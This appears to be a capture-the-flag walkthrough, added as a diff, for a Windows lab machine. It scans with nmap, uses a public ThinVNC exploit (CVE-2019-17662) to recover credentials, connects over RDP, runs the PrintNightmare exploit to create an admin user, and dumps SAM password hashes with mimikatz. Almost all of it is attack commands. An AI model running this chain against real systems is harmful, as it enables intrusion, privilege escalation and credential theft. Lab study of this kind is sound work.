@@ -1,0 +1,53 @@
+Port scanning
+
+	nmap -Pn -vv <ip>
+
+		You get to open ports 8080 and 3389
+
+	on 8080 it is running thinvnc
+
+	confirm by running curl <ip>:8080 -v
+
+	Thinvnc has a public exploit download from  https://github.com/MuirlandOracle/CVE-2019-17662
+
+	This will give you Http Basic auth used by thinvnc and also by rdp
+	
+	connect to rdp using commnd
+		xfreerdp /v:10.10.93.214 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
+
+	/drive:share,/tmp => shares our /tmp directory with the target
+
+	Privesc
+
+	We will use printnightmare to escalate
+
+	Download exploit from https://github.com/calebstewart/calebstew.art
+
+	inside rdp session open powershell window and execute 
+
+	. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1
+
+		\\tsclient\share references the share we created /tmp
+
+
+	in rdp session 
+
+		C:\Users\Atlas> Invoke-Nightmare  This will ctreate a new user admin:P@ssw0rd
+
+	start powershell priocess as an Administrator
+	
+	Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
+
+
+	We have admin acess now to dump the passwords using mimikatz
+
+	Download mimikatz binary and unzip it in /tmp
+
+	To start mimikatz run \\tsclient\share\x64\mimikatz.exe
+
+	then run :
+	privilege::debug > obtains debug privileges which llows us to access other processes for "debugging" purposes.
+
+	token::elevate > takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges
+
+	lsadump::sam > Command to dump passwords hashes
